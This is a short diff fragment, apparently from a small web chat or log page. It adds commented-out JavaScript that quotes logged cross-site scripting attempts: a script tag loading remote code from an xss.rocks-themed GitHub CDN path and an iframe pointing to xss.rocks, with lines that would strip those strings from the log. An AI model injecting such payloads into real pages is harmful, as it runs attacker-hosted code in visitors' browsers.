@@ -1,0 +1,9 @@
+[2023/01/28 02:33:27][98.144.181.104]<div> sth$e$</div>
+
+
+           // var del_error_line1 = "[2023/01/28 14:57:43][77.243.25.8]<div> <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js>\</SCRIPT\>$e$</div>";
+          //  var del_error_line2 = "\n[2023/01/28 14:59:18][77.243.25.8]\<div\> \<iframe\ src=http://xss.rocks/scriptlet.html <$e$</div>";
+            //_t = _t.replaceAll(del_error_line1,"");
+            //var del_error_line2 =  "\<iframe src=http://xss.rocks/scriptlet.html";
+            //_t = _t.replaceAll(del_error_line2,"X_x");
+
